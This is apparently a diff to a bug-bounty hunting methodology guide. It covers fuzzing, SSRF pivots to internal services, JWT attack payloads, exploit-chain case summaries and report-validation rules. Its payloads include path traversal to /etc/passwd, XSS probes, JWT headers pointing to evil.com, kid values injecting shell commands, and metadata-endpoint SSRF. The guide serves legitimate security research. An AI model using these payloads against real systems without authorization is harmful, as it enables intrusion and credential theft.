+curl -s "https://target.com/?search=<script>alert(1)</script>" -D- | head
+curl -s "https://target.com/../../../etc/passwd" -D- | head
+
+# WAF bypass techniques (document which work):
+# - Parameter pollution
+# - Encoding tricks (double URL, unicode)
+# - HTTP method conversion
+# - Case manipulation
+# - Comment injection (/**/)
+# - Newline injection (%0a, %0d)
+# - HTTP/2 downgrade
+# - Request smuggling (CL.TE desync)
+```
+
+## Content Discovery (Directory Fuzzing)
+
+```
+# ffuf — directory and file fuzzing
+ffuf -w ~/wordlists/raft-large-directories.txt -u https://target.com/FUZZ \
+  -mc 200,201,202,204,301,302,307,401,403 -c -t 50
+
+ffuf -w ~/wordlists/raft-large-files.txt -u https://target.com/FUZZ \
+  -mc 200,201,202,204 -c -t 50
+
+# ffuf with extensions
+ffuf -w ~/wordlists/common.txt -u https://target.com/FUZZ \
+  -e .php,.asp,.aspx,.jsp,.json,.xml,.config,.bak,.old,.swp -mc 200,403,401
+
+# Recursive scanning (for known CMS)
+# WordPress
+ffuf -w ~/wordlists/wordpress.txt -u https://target.com/FUZZ -mc 200,301,302,403
+
+# Nginx/Laravel
+ffuf -w ~/wordlists/laravel.txt -u https://target.com/FUZZ -mc 200,301,302,403
+
+# Common exposed files
+# /.git/config → source code disclosure
+# /.env → environment variables
+# /backup/ → backup files
+# /.aws/credentials → AWS keys
+# /phpinfo.php → PHP configuration
+# /info.php → PHP info sometimes
+# /debug → debug mode
+# /console → Django debug
+```
+
+## Threat Modeling Per Feature
+
+```
+For each feature/endpoint discovered, model the threat:
+
+1. Who should access this? (admin, user, public)
+2. What can go wrong?
+   - Data exposure (read someone else's data)
+   - Data manipulation (change someone else's data)
+   - Denial of service (crash the feature)
+   - Privilege escalation (do more than allowed)
+
+3. Attack vectors to test:
+   - User A → User B (horizontal)
+   - Low privilege → High privilege (vertical)
+   - Public → Authenticated (boundary bypass)
+   - One session → Another session (race condition)
+
+4. Trust boundaries:
+   - Client → Server (never trust client)
+   - Internal → External (SSRF)
+   - This service → Other service (pivot)
+   - HTTP → Internal network (SSRF pivot)
+```
+
+## Data Flow Analysis
+
+```
+For each API endpoint, document:
+1. Input sources (request body, URL params, headers, cookies)
+2. Where data goes (database, cache, file system, external API)
+3. Where data comes from (database, cache, third-party)
+4. What transformations happen (encoding, encryption, parsing)
+5. Where output is rendered (JSON response, HTML, PDF, email)
+
+This reveals:
+- Injection points (SQL, NoSQL, template, LDAP, XPath)
+- Stored XSS opportunities (input → storage → admin viewer)
+- SSRF opportunities (input → external HTTP call)
+- IDOR opportunities (input → DB query by ID)
+- Race condition opportunities (read → modify → write patterns)
+```
 
 ## 403 Bypass
 
@@ -373,6 +1261,63 @@ Chart/dashboard embedding         | New Relic ($0)           | XSS + SSRF via un
 
 6. "Check OAuth/SAML integrations — they often fetch URLs"
    → GitLab $4K: OAuth Jira controller unauthenticated SSRF
+```
+
+### Post-SSRF Exploitation: Internal Service Attack Chains
+
+After confirming SSRF, pivot to internal services. Each service below has known exploit chains:
+
+```
+Internal Service     Port    SSRF Protocol    Exploit Chain
+─────────────────────────────────────────────────────────────
+Redis                6379    gopher://        Write SSH key / cron job → RCE
+                     6379    dict://          INFO/SET/GET commands
+Elasticsearch        9200    http://          Read all indices / shutdown nodes
+Docker API           2375    http://          Create privileged container with host mount → RCE
+                     2376    https://         (TLS version)
+Kubernetes API       6443    http://          List pods → exec into pod → RCE
+Jenkins              8080    http://          Script console → Groovy RCE
+Hashicorp Consul     8500    http://          Register service → exec → RCE
+Apache Solr          8983    http://          Shards param → SSRF canary / RCE via dataImportHandler
+Apache Druid         8888    http://          Shutdown tasks / supervisor termination
+Apache Tomcat        8080    gopher://        Deploy WAR → RCE
+FastCGI              9000    gopher://        Write PHP payload → RCE
+MySQL                3306    gopher://        Read all databases
+PostgreSQL           5432    gopher://        Read all databases
+Memcache             11211   gopher://        Write serialized payload → RCE
+Java RMI             1099    gopher://        Deserialization → RCE
+SSRF Canary          varies  http://          Hit internal app that makes external request
+```
+
+**Blind SSRF Canary Technique:**
+```
+Hit an internal service that is known to make external requests:
+- Confluence Sharelinks:  /rest/sharelinks/1.0/link?url=http://your.burpcollaborator/
+- Weblogic UDDI:          /uddiexplorer/SearchPublicRegistries.jsp?operator=http://your.burpcollaborator/
+- Jenkins:                /securityRealm/user/admin/descriptorByName/... (dynamic routing)
+- Solr Shards:            /solr/db/select?q=*&shards=http://your.burpcollaborator/solr
+- Jira makeRequest:       /plugins/servlet/gadgets/makeRequest?url=http://your.burpcollaborator/
+```
+
+### SSRF Response Side-Channel Leaks (Blind → Data)
+```
+When SSRF response isn't directly visible, detect via side channels:
+1. Status code: 200 = service up, 500 = service down/error
+2. Response size: Different internal pages return different sizes
+3. Timing: Responds quickly vs timeout vs error
+4. Error messages: "Connection refused" vs "Connection timed out" vs "Unexpected response"
+
+Use these to:
+- Port scan internal network (map services)
+- Determine service type (Elasticsearch returns JSON, Docker returns specific headers)
+- Version detection (different versions return different content length)
+```
+
+### SSRF Exploitation Tools
+```
+SSRF Proxy:    https://github.com/bcoles/ssrf_proxy  (tunnel HTTP through SSRF)
+Gopherus:      https://github.com/tarunkant/Gopherus  (generate gopher payloads for MySQL/Redis/FastCGI)
+rmg (RMI):     https://github.com/qtc-de/remote-method-guesser  (Java RMI via SSRF)
 ```
 
 ---
@@ -1141,6 +2086,11 @@ Algorithm attacks:
   alg: RS512→HS512 → confusion
   alg: PS256→HS256 → RSA-PSS confusion
   alg: HS256→RS256 → if you have a signed HS256 token and public key
+  alg: EdDSA→HS256 → Ed25519 to HMAC confusion
+  alg: ES256→HS256 → ECDSA to HMAC confusion
+  alg: direct → symmetric key wrapping confusion
+  sig missing:     Remove signature portion (some libs accept)
+  alg: auto → auto-detection mode bypass
 
 Key attacks:
   Secret cracking: john jwt.txt --wordlist=rockyou.txt
@@ -1155,8 +2105,11 @@ Key attacks:
   kid injection:   {"kid":"../../../etc/passwd"} (if kid used in file read)
   kid SQLi:        {"kid":"' UNION SELECT ..."} (if kid used in DB query)
   kid command:     {"kid":"'; id; '"} (if kid used in exec)
-  x5u injection:   {"x5u":"https://evil.com/cert.pem"} (x509 URL)
+  kid SSRF:        {"kid":"http://169.254.169.254/latest/meta-data/"} (if kid fetches URL)
+  x5u injection:   {"x5u":"https://evil.com/cert.pem"} (x509 URL fetch)
   x5c injection:   {"x5c":["MIID..."]} (x509 certificate injection)
+  typ confusion:   {"typ":"at+jwt"} vs {"typ":"application/at+jwt"} → bypass validation
+  crit header:     {"crit":["exp"],"exp":99999999999} → skip validation
 
 Claim attacks:
   exp bypass:   {"exp":9999999999} (far future)
@@ -1169,6 +2122,16 @@ Claim attacks:
   azp:          {"azp":"attacker_client_id"} (authorized party)
   aud:          {"aud":"https://evil.com"} (audience)
   iss:          {"iss":"https://evil.com"} (issuer — if trust all issuers)
+  nonce:        {"nonce":"attacker_nonce"} (replay nonce)
+  jti:          {"jti":"predicted_jti"} (replay older token)
+  acr:          {"acr":"urn:mace:incommon:iap:silver"} → bypass MFA requirement
+  auth_time:    {"auth_time":0} → bypass recent auth requirement
+  allowed-origins: {"allowed-origins":["https://evil.com"]} → origin bypass (AppSync)
+
+Header injection:
+  cty:          {"cty":"JWT"} + nested JWT → nested token parsing bypass
+  b64:          {"b64":false} → base64url encoding disabled → raw JSON in JWT payload
+  zip:          {"zip":"DEF"} → compression → JWT decompression bomb
 ```
 
 ### JWT Tooling
@@ -14346,121 +15309,678 @@ GraphQL mutation with JSON       | __proto__ in input object
 
 ---
 
-## Chain 1 — GitLab $20K: LFI (Path Traversal in image tag) → Read local files
-→ Find secret → Deserialize with secret → RCE
+## Chain Discovery Methodology
 
-Chain 2 — Apple $75K: Safari multiple vulns → Access webcam → RCE
+### 3-Step Chain Process
+```
+1. MAP the data flow:
+   Input A → Process X → Store Y → Read Z → Output B
+   Every arrow is a potential trust boundary to cross.
 
-Chain 3 — Shopify $15K: Register email → Send verification request
-→ Change email before verifying → Confirm new email → Takeover store
+2. IDENTIFY trust boundary violations:
+   - Can I inject into Input A that Process X uses unsafely?
+   - Can I read from Store Y that I shouldn't read?
+   - Does Read Z trust data from Store Y without validation?
 
-Chain 4 — Slack $6.5K: HTTP Request Smuggling → Steal session cookies → Mass ATO
-
-Chain 5 — Dropbox $17.5K: Google Drive SSRF (Full Response) → Internal network → Keys
-
-Chain 6 — GitLab $33.5K: DecompressedArchiveSizeValidator bypass
-→ Bulk Import → RCE
-
-Chain 7 — PayPal $30K: npm misconfig install internal libs from public registry → RCE
-
-Chain 8 — Pornhub $20K: PHP Deserialization via cookie → Remote shell/command execution
-
-Chain 9 — Snapchat $25K: Exposed Kubernetes API → RCE/Credentials
-
-Chain 10 — LINE Corp $5K: Spring Actuator exposed → environment secrets → full compromise
-
-Chain 11 — Valve $10K: Buffer overflow in Steam client Server Info → RCE
+3. CONNECT the chain:
+   Bug A (at trust boundary 1) → enables Bug B (at trust boundary 2)
+   → enables Bug C (at trust boundary 3) → impact
 ```
 
+### Chain Building Principles
+```
+1. Each link must be independently exploitable:
+   Bug A works without Bug B. Bug B works without Bug A.
+   BUT chaining them creates > sum of parts impact.
+
+2. Chain ≠ two separate reports:
+   If A and B are independent bugs with independent payouts
+   → Submit separately (2x bounty)
+   If A is needed for B, and A alone has no impact
+   → Submit as one chain (1x bounty, higher severity)
+
+3. Common chain patterns:
+   Weak auth + Missing auth on endpoint → ATO
+   SSRF + Internal service w/o auth → RCE
+   IDOR + Stored XSS → Admin ATO
+   Open redirect + OAuth → Token theft
+   Host header injection + Password reset → ATO
+   Prototype pollution + Auth check → Admin bypass
+   CSRF + Sensitive action → Full ATO
+   S3 listing + JS secrets → Cloud compromise
+   Subdomain takeover + OAuth → Token theft
+   Race condition + Financial operation → Free money
+   Cache poisoning + Unkeyed header → XSS on all visitors
+   Input validation bypass + Template engine → SSTI → RCE
+   Information disclosure + Weak credential → Privilege escalation
+```
+
+### How to Find Chains (Hunting Workflow)
+```
+1. After finding Bug A:
+   "What can I DO with this? What doors does it open?"
+   - Can read internal URLs? → Find endpoints (SSRF)
+   - Can read files? → Find secrets
+   - Can write data? → Find where it's rendered
+   - Can execute code? → Find what else runs on same host
+   - Can see responses? → Find what other services exist
+   - Can change my data? → Find where admin views it
+
+2. Sibling hunting:
+   Same dev → same mistakes
+   Found IDOR in /api/users? → check /api/orders, /api/payments
+   Found path traversal in image tag? → check video tag, file download
+
+3. Chain maintenance:
+   After chain confirmed: test patch → incomplete fix = new bounty
+   Document full chain for report: "request A → request B → response C"
+```
+
+### Chain Report Template
+```
+# CHAIN REPORT: [Bug A Name] + [Bug B Name] = [Final Impact]
+
+## Chain Summary
+[1-2 sentences explaining how A enables B to achieve impact]
+
+## Bug A: [Name]
+- Endpoint: [URL with method]
+- Root cause: [Why this bug exists]
+- PoC: [Exact request/response]
+- Alone impact: [What attacker gets from A alone]
+
+## Bug B: [Name]
+- Endpoint: [URL with method]
+- Root cause: [Why this bug exists]
+- PoC: [Exact request/response]
+- Alone impact: [What attacker gets from B alone]
+
+## Chain Execution (Step by Step)
+1. [Step 1: trigger Bug A → result]
+2. [Step 2: use Bug A result to exploit Bug B]
+3. [Step 3: final impact achieved]
+
+## Final Impact
+[What the attacker walks away with]
+
+## Why This Is Not Two Separate Reports
+[Bug A alone = no impact or low impact]
+[Bug B alone = no impact or low impact]
+[Only the chain creates HIGH/CRITICAL impact]
+```
+
+## Chain 1 — GitLab $20K: LFI → Secret → Deserialize → RCE
+```
+Path traversal in image tag → read local files (secret) → deserialize with secret → RCE
+```
+**Root cause:** Unvalidated image file path + file read allowed secret extraction from disk
+
+## Chain 2 — Apple $75K: Safari WebKit → Access webcam → RCE
+```
+Multiple Safari vulnerabilities (WebKit bugs) → chain for webcam access → full RCE
+```
+**Root cause:** Memory corruption chain across Safari components
+
+## Chain 3 — Shopify $15K: Email Confirmation Bypass → ATO
+```
+Register with email → Send verification request → Change email before verifying
+→ Confirm new email → Takeover store account
+```
+**Root cause:** Race condition between verification email send and email change
+
+## Chain 4 — Slack $6.5K: HTTP Request Smuggling → Session theft → Mass ATO
+```
+CL.TE desync → poison next request → steal session cookies → mass account takeover
+```
+**Root cause:** Frontend/backend parsing mismatch on Content-Length vs Transfer-Encoding
+
+## Chain 5 — Dropbox $17.5K: SSRF (Full Response) → Internal network → Keys
+```
+Google Drive SSRF with full response → access internal network services → extract credentials
+```
+**Root cause:** Server-side URL fetch without proper allowlist, full response reflected
+
+## Chain 6 — GitLab $33.5K: Archive bypass → Bulk Import → RCE
+```
+DecompressedArchiveSizeValidator bypass → bulk import with crafted archive → RCE on import
+```
+**Root cause:** Archive validation bypass allowing decompression bomb + code execution
+
+## Chain 7 — PayPal $30K: npm misconfig → Supply chain → RCE
+```
+Npm installed internal libraries from public registry → malicious package takeover → RCE
+```
+**Root cause:** npm registry misconfiguration allowing public package name squatting
+
+## Chain 8 — Pornhub $20K: PHP deserialization → RCE
+```
+Cookie contains serialized PHP object → __wakeup() gadget chain → remote shell
+```
+**Root cause:** Unsafe unserialize() on user-controlled cookie data
+
+## Chain 9 — Snapchat $25K: K8s API exposed → Pod exec → RCE
+```
+Kubernetes API exposed without auth → list pods → exec into pod → full cluster compromise
+```
+**Root cause:** Kubernetes API server exposed to internet without authentication
+
+## Chain 10 — LINE Corp $5K: Spring Actuator → Secrets dump
+```
+Spring Actuator /actuator/env exposed → environment variables contain secrets → full compromise
+```
+**Root cause:** Actuator endpoints not secured behind authentication
+
+## Chain 11 — Valve $10K: Buffer overflow → RCE
+```
+Buffer overflow in Steam client Server Info parsing → ROP chain → arbitrary code execution
+```
+**Root cause:** Lack of bounds checking on server info data
+
+## Chain 12 — Twitter/X $15K: IDOR in DM attachment → PII
+```
+IDOR on DM attachment URL → read any user's private attachments → PII/data leakage
+```
+**Root cause:** Object reference in URL without ownership check
+
+## Chain 13 — Uber $10K: OAuth session hijack → Full ATO
+```
+OAuth redirect_uri not validated → steal auth code via open redirect → login as victim
+```
+**Root cause:** redirect_uri validation missing in OAuth flow
+
+## Chain 14 — Shopify $30K: GraphQL IDOR → All stores data
+```
+GraphQL node() query without auth → enumerate any store ID → read all store configurations
+```
+**Root cause:** Missing authorization check on GraphQL node resolver
+
+## Chain 15 — HackerOne $12.5K: GraphQL introspection → IDOR → user data
+```
+GraphQL introspection enabled → discover undocumented queries → IDOR via node() → all user data
+```
+**Root cause:** GraphQL introspection leaks schema; node() lacks access control
+
+## Chain 16 — TikTok $15K: CSRF → Email change → ATO
+```
+CSRF on email change endpoint → victim clicks link → attacker email set → password reset → ATO
+```
+**Root cause:** No CSRF token on email change + no email confirmation for change
+
+## Chain 17 — GitLab $10K: SSTI → RCE
+```
+Template injection in issue description → Jinja2 SSTI → arbitrary Python execution → RCE
+```
+**Root cause:** User input rendered in template engine without sanitization
+
+## Chain 18 — Discord $5K: Race condition → Double spend
+```
+Race on Nitro gift redemption → claim same gift code twice → unlimited free subscriptions
+```
+**Root cause:** No locking on gift code redemption — TOCTOU
+
+## Chain 19 — Cloudflare $15K: Cache poisoning → XSS on homepage
+```
+Cache poisoned via unkeyed header → stored XSS payload served to all visitors → mass XSS
+```
+**Root cause:** Cache key doesn't include request header that affects response content
+
+## Chain 20 — Facebook $40K: XXE → SSRF → Internal service → RCE
+```
+XML parser with external entities enabled → SSRF to internal metadata service → credentials → remote access
+```
+**Root cause:** XXE allows outbound connection; internal metadata service returns secrets
+
+## Chain 21 — Blind SSRF → RCE (via Redis internal)
+```
+Blind SSRF via gopher:// → internal Redis on 6379 → write SSH key → shell access
+```
+**Root cause:** Redis without auth; SSRF protocol allows gopher:// for raw bytes
+
+## Chain 22 — Blind SSRF → RCE (via internal Jenkins)
+```
+Blind SSRF → curl to internal Jenkins → Jenkins script console → Groovy RCE
+```
+**Root cause:** Jenkins accessible internally without auth; script console allows command execution
+
+## Chain 23 — Blind SSRF → RCE (via K8s API)
+```
+Blind SSRF → reach internal K8s API → create pod with host mount → read node filesystem
+```
+**Root cause:** K8s API without auth internally; pod creation allows host path mounts
+
+## Chain 24 — Blind SSRF → RCE (via Docker API)
+```
+Blind SSRF to Docker API (port 2375) → create container with host FS mount → read host files
+```
+**Root cause:** Docker API exposed without auth on internal network
+
+## Chain 25 — IDOR → Stored XSS → Admin ATO
+```
+IDOR to edit widget content → inject XSS payload → stored XSS triggers in admin panel → admin session stolen
+```
+**Root cause:** IDOR allows modifying another user's content; content rendered without sanitization in admin
+
+## Chain 26 — Subdomain Takeover → OAuth token theft → ATO
+```
+Takeover subdomain used as OAuth redirect_uri → steal OAuth authorization code → login as victim
+```
+**Root cause:** DNS record pointing to unclaimed cloud service; redirect_uri not strictly validated
+
+## Chain 27 — Host Header Injection → Password reset poison → ATO
+```
+Inject malicious Host header in password reset → password reset link sent to attacker domain → reset victim password
+```
+**Root cause:** Password reset link generated using untrusted Host header value
+
+## Chain 28 — CORS wildcard + Authenticated API → PII mass exfil
+```
+API returns Access-Control-Allow-Origin: * with credentials → attacker site reads authenticated API → PII of all users
+```
+**Root cause:** CORS allows any origin with credentials on authenticated endpoint
+
+## Chain 29 — S3 bucket listing → JS secrets → Cloud access
+```
+S3 bucket listing enabled → find JS bundles containing AWS keys → assume role → cloud resources compromised
+```
+**Root cause:** S3 bucket public listing; JS bundles contain hardcoded cloud credentials
+
+## Chain 30 — Prototype Pollution → Auth bypass → Admin
+```
+__proto__ injection via JSON merge → set isAdmin: true → bypass auth check → admin access
+```
+**Root cause:** Deep merge without __proto__ filtering; auth check reads from polluted object
+
+```
+
+
 ## Escalation Decision Tree
+
 ```
 What you found:
 +-- XSS
-|   +-- Can steal cookie/token? → Session hijack → ATO
-|   +-- Cookie is HttpOnly? → Force email change via XHR → ATO
-|   +-- Self-XSS only? → Find CSRF to trigger it
-|   +-- Blind XSS? → Target admin panel → full account access
+|   +-- Reflected + no HttpOnly? → steal cookie → ATO
+|   +-- HttpOnly cookie? → XHR to /api/user/email → change email → ATO
+|   +-- Self-XSS only? → Find CSRF to auto-trigger it on victim
+|   +-- Stored (admin view)? → steal admin session → full system access
+|   +-- Stored (user view)? → mass ATO via CSRF + stored XSS
+|   +-- Blind XSS? → target admin panel → full account access
+|   +-- DOM-based? → can bypass CSP? → cookie theft
 +-- IDOR
 |   +-- Can read PII? → Automate scraping, show scale (1000s of users)
+|   +-- Can read payment data? → financial impact → HIGH
 |   +-- Can change password/email? → Direct ATO
-|   +-- UUID only? → Find UUID leak source, then retry
+|   +-- UUID only? → Find UUID leak source (profile page, reset email, support)
+|   +-- UUID is guessable? (timestamp-based, sequential) → mass enumeration
+|   +-- GraphQL node()? → IDOR via field selection
 +-- SSRF
-|   +-- DNS only? → DON'T REPORT. Try harder
-|   +-- Can reach 169.254.169.254? → Extract keys → RCE
-|   +-- Internal port scan? → Find Redis/K8s → RCE
+|   +-- DNS only? → DON'T REPORT. Find internal services
+|   +-- Can reach 169.254.169.254? → Extract IAM keys → cloud RCE
+|   +-- Can use gopher://? → Redis/FastCGI/Tomcat → RCE
+|   +-- Can use file://? → LFI → read source code → find secrets
+|   +-- Internal HTTP? → Jenkins/Consul/K8s API → RCE
+|   +-- Full response? → read internal service data directly
+|   +-- Blind? → SSRF canary → find internal service → pivot
 +-- SQLi
-|   +-- Error-based? → Extract data (passwords, tokens)
-|   +-- Can INTO OUTFILE? → Web shell → RCE
-|   +-- Blind? → Boolean/Time extraction
+|   +-- Error-based? → Extract data (passwords, tokens, hashes)
+|   +-- UNION? → Full DB dump via SQLmap
+|   +-- Blind/time-based? → Extract data character by character
+|   +-- Can INTO OUTFILE? → Write web shell → RCE
+|   +-- Can INTO DUMPFILE? → Write binary → RCE
+|   +-- Can LOAD FILE? → Read server files → LFI
+|   +-- Second-order? → Inject in one field, triggers in another
+|   +-- NoSQL? → MongoDB $where → JS injection → RCE possible
 +-- Open Redirect
-|   +-- OAuth flow? → Token theft → ATO
-|   +-- javascript: scheme? → XSS
+|   +-- OAuth redirect_uri? → Steal auth code → ATO
+|   +-- OIDC redirect_uri? → Token theft → ATO
+|   +-- javascript: scheme? → XSS on same origin
+|   +-- CRLF in redirect? → HTTP response splitting → cache poisoning
+|   +-- meta refresh? → same as open redirect
 +-- Insecure Deserialization
-|   +-- PHP? → phpggc gadget chain → RCE
+|   +-- PHP? → phpggc → gadget chain → RCE
 |   +-- Java? → ysoserial → RCE
 |   +-- Python pickle? → __reduce__ → RCE
+|   +-- .NET? → ViewState exploit → RCE
+|   +-- Ruby? → MARSHAL.load → RCE
+|   +-- Node.js? → node-serialize → RCE
+|   +-- YAML? → SnakeYAML → JNDI injection → RCE
 +-- Path Traversal / LFI
-|   +-- Can read /etc/passwd? → Read source code → find more vulns
-|   +-- Log poison? → PHP code execution → RCE
+|   +-- Can read /etc/passwd? → confirm → read source code → find secrets
+|   +-- Can read /proc/self/environ? → env vars → keys/secrets
+|   +-- Log poison via X-Forwarded-For? → PHP code in logs → RCE
+|   +-- PHP wrapper php://filter? → base64-encode source → code review
+|   +── ZIP wrapper? → phar deserialization → RCE
 +-- Command Injection
 |   +-- Blind? → OOB exfil via DNS/HTTP
 |   +-- Reflected? → Direct RCE
+|   +-- Time-based? → sleep test → blind command exfil
 +-- CSRF
-|   +-- Change email? → CSRF → ATO
-|   +-- Change password? → CSRF → ATO
-|   +-- Disable 2FA? → CSRF → account access
+|   +-- Change email? → CSRF → ATO via password reset
+|   +-- Change password? → CSRF → Direct ATO
+|   +-- Disable 2FA? → CSRF → then ATO
+|   +-- Transfer funds? → CSRF → financial theft
+|   +-- OAuth connect/disconnect? → CSRF → ATO
+|   +-- JSON endpoint? → CSRF via enctype=text/plain
 +-- Host Header Injection
 |   +-- Password reset? → Poison Host → steal reset link → ATO
+|   +-- Cache poisoning? → poison Host header → cache malicious redirect
+|   +-- SSRF via Host? → internal routing confusion
 +-- Mass Assignment
 |   +-- isAdmin:true? → Privilege escalation
+|   +-- role:admin? → Role escalation
+|   +-- email:hacker@evil.com? → Email takeover
+|   +-- credits:999999? → Free purchases
+|   +-- verified:true? → Bypass email verification
 +-- No rate limit
 |   +-- Login? → Brute force → ATO
-|   +-- OTP? → Brute → ATO
-|   +-- Coupon? → Free stuff
+|   +-- OTP/2FA code? → Brute (6-digit = 1M tries, 4-digit = 10K) → ATO
+|   +-- Coupon? → Free stuff / discount abuse
+|   +-- Password reset? → Brute reset token → ATO
+|   +-- Invite code? → Unlimited invites
+|   +-- API key generation? → Resource exhaustion
 +-- Spring Actuator
 |   +-- /actuator/heapdump? → Download → extract all secrets in memory
-|   +-- /actuator/env? → Environment vars → keys
+|   +-- /actuator/env? → Environment vars → keys/tokens
+|   +-- /actuator/beans? → Find all beans → identify attack surface
+|   +-- /actuator/mappings? → All URL mappings → discover hidden endpoints
+|   +-- /actuator/loggers? → Change log level → recon
+|   +-- /actuator/refresh? → Refresh config → env update
 +-- Kubernetes API exposed
 |   +-- Can list pods? → exec into pod → RCE
-|   +-- Can create pods? → deploy malicious pod → RCE
+|   +-- Can create pods? → deploy malicious pod with host mount → RCE
+|   +-- Can get secrets? → read all K8s secrets → cloud credentials
+|   +-- Can list services? → find internal services → pivot
+|   +-- Can access dashboard? → K8s dashboard → full cluster control
++-- JWT Attack
+|   +-- alg:none? → Create arbitrary tokens → ATO any account
+|   +-- RS256→HS256 confusion? → Sign with public key → ATO
+|   +-- Weak secret? → Crack JWT → forge tokens → ATO
+|   +── JWK injection? → Inject own public key → ATO
+|   +-- kid header injection? → Path traversal in kid → use arbitrary file as key
+|   +-- Token not revoked? → Session replay → ATO
++-- Race Condition
+|   +-- Coupon → apply same coupon 10x simultaneously → unlimited discount
+|   +-- Money transfer → withdraw + transfer simultaneously → double spend
+|   +-- Like/follow → send 100 parallel requests → multiple votes
+|   +-- Account creation → create + escalate simultaneously → privilege bypass
++-- GraphQL
+|   +-- Introspection on? → dump full schema → find hidden mutations
+|   +── Batch queries? → batching → bypass rate limits
+|   +-- Depth > 10? → Deep query → DoS
+|   +-- Alias-based? → Aliases → bypass rate limits + enum
+|   +-- node() interface? → IDOR via node() on any object
+|   +-- Mutation with __proto__? → Prototype pollution
++-- Prototype Pollution
+|   +-- Server-side? → __proto__.isAdmin → auth bypass
+|   +-- Client-side? → __proto__.innerHTML → DOM XSS
+|   +-- Merge gadget? → find merge utility → pollution path
 ```
 
 ---
 
 # PHASE 5: VALIDATE & REPORT
 
-## 7-Question Gate (Kill finding if ANY fail)
+> "N/A hurts your validity ratio. Informative is neutral. Only submit what passes all gates."
 
-1. Can attacker DIRECTLY benefit? Not "dev could improve security"
-2. Is there ACTUAL IMPACT? Not theoretical "information leakage"
-3. Is this IN SCOPE? (explicitly or implicitly)
-4. Is this a REAL BUG, not intended behavior?
-5. Can you REPRODUCE consistently?
-6. Does it work on LATEST production?
-7. Is it CLEARLY exploitable?
+## THE ONLY QUESTION THAT MATTERS
 
-## Always-Rejected List (Don't Waste Time)
+```
+Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions 
+— and does it cause real harm (stolen money, leaked PII, ATO, code execution)?
+```
 
-- Missing SPF/DMARC records (alone — reportable if chained with password reset / email verification bypass)
-- Missing HSTS header
-- Self-XSS without a CSRF chain
-- Missing rate limit on non-auth endpoints
-- Missing CSRF on public/GET endpoints
-- Email bombing (unless chained to impact)
-- Clickjacking without demonstrated impact
-- Missing security headers alone
-- CSP reporting only (no bypass)
-- Missing cookie flags on non-sensitive cookies
-- Information disclosure of non-sensitive data
-- TLS/SSL config issues (unless in scope)
-- Username enumeration on login (low priority alone)
+**If NO → STOP. Do not write. Do not explore further. Move on.**
+
+---
+
+## RULE 1: FALSE POSITIVE CHECK FIRST
+
+Before anything else, verify with EXACT HTTP response:
+
+```
+Can I PROVE this bug with a real HTTP response showing actual victim data / actual impact?
+```
+
+**These are FALSE POSITIVES — KILL THEM IMMEDIATELY:**
+```
+- Server returns 200 but body is {} or null     → NOT proof
+- Server returns 401/403                         → access BLOCKED, not accessible
+- Response has YOUR data only                    → NOT IDOR. Need ANOTHER user's data
+- Response is IDENTICAL for all inputs           → NOT a vuln (catch-all route)
+- Timing differences only, no data returned      → NOT exploitable
+- "Technically possible if X, Y, Z align"        → PROVE IT or KILL IT
+- "Could potentially allow..."                   → STOP. Either it does or it doesn't
+- Source maps / config without actual secrets    → NOT a finding
+- Code reading without HTTP confirmation         → NOT a finding
+```
+
+---
+
+## RULE 2: THE 7-QUESTION GATE
+
+Answer ALL 7 in order. **One NO = KILL IT IMMEDIATELY.**
+
+### Q1: Can an attacker use this RIGHT NOW, step by step?
+```
+1. Setup:   I need [own account / no account / another user's ID]
+2. Request: [exact METHOD, URL, Headers, Body — copy-paste ready]
+3. Result:  I receive [exact data in response — paste it here]
+4. Impact:  Attacker can [read PII / take over account / steal money]
+5. Cost:    Time: [X min], Money: [$0]
+```
+**If step 2 is not a real HTTP request you already sent → KILL IT**
+**If step 3 shows empty, default, or your own data → KILL IT**
+
+### Q2: Is the impact on the program's accepted impact list?
+```
+- Critical:  Any-user ATO without interaction, RCE, SQLi with data exfil
+- High:      Mass PII exfil, privilege escalation, SSRF with data
+- Medium:    IDOR on non-critical data, XSS requiring click
+- Low:       Non-sensitive info disclosure, clickjacking with PoC
+```
+**If your bug maps to a listed exclusion → KILL IT**
+
+### Q3: Is the root cause in an in-scope asset?
+- Domain on scope list? Production (not staging/dev)? Owned by target (not 3rd party)?
+**If out-of-scope → KILL IT**
+
+### Q4: Does it require unrealistic preconditions?
+- "Admin can do X" = NOT a bug (centralization risk)
+- "Requires compromised victim session" = questionable, low severity
+- "Requires physical access / MFA device" = usually invalid
+- "Victim must click attacker's link AND login AND navigate to page X" = too many conditions
+
+### Q5: Is this already known or accepted behavior?
+```
+1. Search HackerOne disclosed reports: Ctrl+F endpoint + bug class
+2. Search GitHub issues: is:issue label:security ENDPOINT
+3. Check CHANGELOG / API docs — is it documented as intended?
+```
+**If acknowledged/design decision → KILL IT**
+
+### Q6: Can you prove real impact?
+```
+BAD:  "The endpoint returns more fields than necessary"
+GOOD: "Endpoint returns victim's email, phone, address, and payment last-4"
+
+BAD:  "SSRF detected via DNS callback"
+GOOD: "SSRF to cloud metadata returns IAM credentials"
+
+BAD:  "XSS fires alert(1)"
+GOOD: "XSS steals document.cookie containing session token"
+```
+**If you can only show "technically possible" → KILL IT**
+**If data exposed is not sensitive (public info, product names) → KILL IT**
+
+### Q7: Is this a known-invalid bug class?
+Check the ALWAYS-REJECTED LIST below. If it's on the list without a chain → **KILL IT**
+
+---
+
+## RULE 3: KILL FAST RULES
+
+Time-box your validation. These rules prevent rabbit holes:
+
+```
+1. 5-MINUTE RULE:  Can't fill Q1 template in 5 minutes? → KILL IT
+2. PRECONDITION COUNT: More than 2 preconditions? → KILL IT
+3. IMPACT TEST: "What does attacker walk away with?" — nothing tangible? → KILL IT
+4. ADMIN BYPASS: "Admin can do X" is NEVER a bug → KILL IT
+5. DESIGN DOC TEST: If documented behavior → KILL IT
+6. RABBIT HOLE SIGNAL: 30+ min on Q6 with no reproducible PoC → KILL IT
+7. 20-MINUTE ROTATION: No progress on endpoint in 20 min? → ROTATE
+```
+
+---
+
+## RULE 4: ANTI-PATTERNS THAT LOSE MONEY
+
+```
+Writing a report before confirming the bug exists             (most common mistake)
+Submitting theoretical impact without proof                    ("could be used to...")
+"The API returns more fields than necessary"                    (sensitivity matters)
+Chaining A+B into one report when they're separate bugs        (two separate payouts)
+Reporting B saying "similar to A in my other report"           (fresh Gate 0 for every bug)
+Overclaiming severity                                           (triagers trust you less)
+Under-describing impact                                         (triager doesn't understand)
+```
+
+---
+
+## RULE 5: NEVER REPORT THEORETICAL BUGS
+
+```
+❌ "The API returns 200" — what does the BODY contain? If empty/default → not a vuln
